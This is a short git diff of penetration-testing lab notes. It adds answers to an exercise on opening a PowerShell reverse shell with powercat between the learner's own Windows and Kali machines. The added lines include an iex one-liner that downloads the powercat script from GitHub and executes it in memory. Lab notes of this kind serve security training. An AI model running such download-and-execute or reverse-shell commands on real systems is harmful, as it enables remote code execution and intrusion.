@@ -37,7 +37,10 @@ target windows machine do a callback using socat
 _(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_
 
 1.  Use **PowerShell** and **powercat** to create a reverse shell from your Windows system to your Kali machine.
-
+run dot-sourcing script
+`. .\powercat.ps1`
+or use iex cmdlet
+`iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')`
 
 2.  Use **PowerShell** and **powercat** to create a bind shell on your Windows system and connect to it from your Kali machine. Can you also use **powercat** to connect to it locally?
 
